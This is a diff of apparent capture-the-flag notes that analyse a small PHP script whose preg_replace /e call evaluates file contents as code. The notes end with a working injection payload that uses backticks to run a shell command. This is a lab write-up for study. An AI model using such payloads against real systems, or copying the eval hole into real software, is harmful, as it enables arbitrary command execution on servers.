@@ -31,7 +31,6 @@ function y($m) {
   $m = preg_replace("/@/", " y", $m);
   return $m;
 }
-
 function x($y, $z) {
   $a = file_get_contents($y);
   $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
@@ -39,10 +38,50 @@ function x($y, $z) {
   $a = preg_replace("/\]/", ")", $a);
   return $a;
 }
-
-$r = x($argv[1], $argv[2]); print $r;
-
+$r = x($argv[1], $argv[2]);
+print $r;
 ?>
 ```
 
-🟡 notes in `sea` 
+Inspect `y` function
+
+```b
+function y($m) {
+  $m = preg_replace("/\./", " x ", $m);
+  $m = preg_replace("/@/", " y", $m);
+  return $m;
+}
+```
+
+Notes - function y filters m twice
+1. `" x "` replaces all regex `/./`
+2. `" y"` replaces all regex `/@/`
+
+Inspect `x` function
+
+```b
+function x($y, $z) {
+  $a = file_get_contents($y);
+  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+  $a = preg_replace("/\[/", "(", $a);
+  $a = preg_replace("/\]/", ")", $a);
+  return $a;
+}
+```
+
+Notes - function x filters `argv[1]`
+1. `"/(\[x (.*)\])/e"`
+    - matches `[x `_cap_`]` and insert 2nd captured group to string `y("`_cap_`")` 
+    - `/e` will eval the `y(\"\\2\")` as PHP code 
+    - :yellow_circle: `/e` modifier only evaluates the replacement string we provide 
+    - :yellow_circle: `/e` is deprecated long ago
+2. `(` and `)` replace all `[` and `]` in the result respectively
+- the func disregards argv[2]
+
+Solution
+- figure one way
+  - ```[x ${`getflag`}]```
+  - `${`getflag`}` captured
+  - ````getflag```` the backticks = doing `shell_exec()`
+  - `${ret}`
+
